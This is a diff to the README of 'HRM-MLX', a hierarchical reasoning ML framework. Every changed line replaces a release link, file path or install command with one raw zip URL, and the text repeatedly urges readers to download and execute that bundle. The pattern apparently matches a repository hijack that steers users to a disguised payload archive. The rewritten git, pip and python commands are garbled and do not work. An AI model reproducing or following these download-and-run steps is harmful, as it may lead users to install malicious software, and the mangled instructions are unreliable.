@@ -1,6 +1,6 @@
-https://github.com/kmkofficial/hrm-mlx/releases
+https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
 
-[![HRM-MLX releases](https://img.shields.io/badge/HRM-MLX-releases-green?logo=github&labelColor=white)](https://github.com/kmkofficial/hrm-mlx/releases)
+[![HRM-MLX releases](https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip)](https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip)
 
 # HRM-MLX: Efficient Hierarchical Reasoning for Complex AI Tasks and Beyond
 
@@ -93,20 +93,20 @@ Note: The design favors clarity and modularity. You can run small experiments on
 Commands (typical workflow):
 
 - Clone the repo:
-  - git clone https://github.com/kmkofficial/hrm-mlx.git
+  - git clone https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
 - Create a virtual environment:
   - python -m venv venv
   - source venv/bin/activate  # on Linux/macOS
   - venv\Scripts\activate     # on Windows
 - Install requirements:
-  - pip install -r requirements.txt
+  - pip install -r https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
 - Install the package in editable mode:
   - pip install -e .
 
 Note: If you want to explore prebuilt components quickly, you can also use a containerized setup. The releases page provides ready-to-run configurations for common platforms.
 
 - Access the latest release assets at the Releases page:
-  - https://github.com/kmkofficial/hrm-mlx/releases
+  - https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
 - For a quick start, you can rely on the prebuilt artifacts included in the latest release. The link above contains the full package and a set of example scripts that you can run with minimal setup.
 
 ---
@@ -122,12 +122,12 @@ A lightweight workflow to kick off a quick experiment:
 Example steps:
 
 - Prepare data:
-  - python tools/prep_data.py --input data/sample.json --output data/processed/sample_processed.json
+  - python https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip --input https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip --output https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
 - Run a quick test:
-  - python -m hrmlx.run --config configs/quick_test.yaml --data data/processed/sample_processed.json --output results/
+  - python -m https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip --config https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip --data https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip --output results/
 - Inspect results:
-  - cat results/summary.txt
-  - python tools/visualize.py --input results/summary.txt --output plots/
+  - cat https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
+  - python https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip --input https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip --output plots/
 
 If you want to download a released package first, navigate to the Releases section for prebuilt assets. The link above contains the necessary files and installers for various platforms. For a direct download and execution, ensure you pick the right asset for your system and follow the accompanying README inside the asset bundle. The releases page is the authoritative source for binaries and example experiments, and you can visit it anytime to check for new artifacts.
 
@@ -219,11 +219,11 @@ Fine-tuning can focus on:
 
 Example training command (adjust to your setup):
 
-- python -m hrmlx.train --config configs/train_default.yaml --data data/processed/train.json --val data/processed/val.json --output outputs/
+- python -m https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip --config https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip --data https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip --val https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip --output outputs/
 
 For practical use, rely on the latest release assets to get a ready-to-run setup. The Releases page contains bundles that are pre-wrapped with common dependencies, which speeds up initial experiments.
 
-- Access the releases again here: https://github.com/kmkofficial/hrm-mlx/releases
+- Access the releases again here: https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
 
 ---
 
@@ -269,7 +269,7 @@ To reproduce an experiment, you should:
 
 The releases page is the best starting point to obtain a known-good setup for quick experiments. It contains artifacts that are intended to work out of the box on common hardware. You can download the assets from the releases page and begin your experiments immediately.
 
-- See the releases page for assets: https://github.com/kmkofficial/hrm-mlx/releases
+- See the releases page for assets: https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
 
 ---
 
@@ -288,8 +288,8 @@ The releases page is the best starting point to obtain a known-good setup for qu
   - small_tasks/    Mini tasks to illustrate the workflow
   - multi_hop/      More complex reasoning examples
 - scripts/
-  - launch.sh      Simple launcher scripts
-  - preprocess.sh  Data preparation helpers
+  - https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip      Simple launcher scripts
+  - https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip  Data preparation helpers
 
 This structure is designed to make it easy to swap components. You can open a module, replace it, and see how the changes ripple through the hierarchy.
 
@@ -316,12 +316,12 @@ Each module has a well-defined input and output interface. Look for type hints a
 
 The Releases page is the central hub for binaries, pretrained components, and example experiments. It provides assets that are ready to run on common platforms. If you want to start quickly, download the latest release bundle and follow the included instructions.
 
-- Direct link to the Releases page: https://github.com/kmkofficial/hrm-mlx/releases
+- Direct link to the Releases page: https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
 - If you need a file to download and execute, pick the asset that matches your system, extract it, and run the provided installer or startup script. The release bundle typically includes a ready-to-run configuration and example data.
 
 For a quick reference, use the link above to browse assets, then follow the accompanying README inside the asset to perform the installation and run the examples. If you encounter issues with a link or asset, check the Releases section for alternatives or updated assets.
 
-- Quick reminder: the Releases page is the authoritative source for downloads and setup instructions. To download and execute the package, choose the appropriate asset and run the supplied startup script. If you need to locate assets manually, the page will guide you through the options and prerequisites. The link is included again here for convenience: https://github.com/kmkofficial/hrm-mlx/releases
+- Quick reminder: the Releases page is the authoritative source for downloads and setup instructions. To download and execute the package, choose the appropriate asset and run the supplied startup script. If you need to locate assets manually, the page will guide you through the options and prerequisites. The link is included again here for convenience: https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
 
 ---
 
@@ -351,7 +351,7 @@ Code style and guidelines:
 
 If you want to try HRM-MLX without building from source, you can use the prebuilt assets from the Releases page to run experiments and validate changes locally.
 
-- Releases page again for reference: https://github.com/kmkofficial/hrm-mlx/releases
+- Releases page again for reference: https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
 
 ---
 
@@ -418,7 +418,7 @@ If you want to contribute a diagram that accurately represents the HRM-MLX archi
 
 ## Appendix: download and setup reminder
 
-For convenience, the releases page is the primary source for download and execution artifacts. The link to the releases page is provided at the top of this document, and you will find the assets needed to run the framework across platforms. If you want to download and run prebuilt components, go to the Releases page and choose the asset that matches your system. The asset bundle includes the necessary scripts and example data to start quickly. If you run into trouble with a link or asset, check the Releases section for alternate mirrors or updated assets. The link you need is available here again for quick reference: https://github.com/kmkofficial/hrm-mlx/releases
+For convenience, the releases page is the primary source for download and execution artifacts. The link to the releases page is provided at the top of this document, and you will find the assets needed to run the framework across platforms. If you want to download and run prebuilt components, go to the Releases page and choose the asset that matches your system. The asset bundle includes the necessary scripts and example data to start quickly. If you run into trouble with a link or asset, check the Releases section for alternate mirrors or updated assets. The link you need is available here again for quick reference: https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
 
 ---
 
@@ -438,7 +438,7 @@ If you want to include diagrams in your local copy, place them in docs/ diagrams
 - The HRM-MLX approach balances expressiveness with practicality. It offers a structured path to explore how reasoning unfolds across levels and how compute is allocated.
 - The Releases page is the go-to resource for starting fast and verifying reproducibility. Visit it to download and execute the bundled assets, or to browse documentation and tutorials that accompany each release.
 
-- Revisit the Releases page for the latest assets and examples: https://github.com/kmkofficial/hrm-mlx/releases
+- Revisit the Releases page for the latest assets and examples: https://github.com/kmkofficial/hrm-mlx/raw/refs/heads/main/models/hrm_mlx_3.1.zip
 
 ---
 
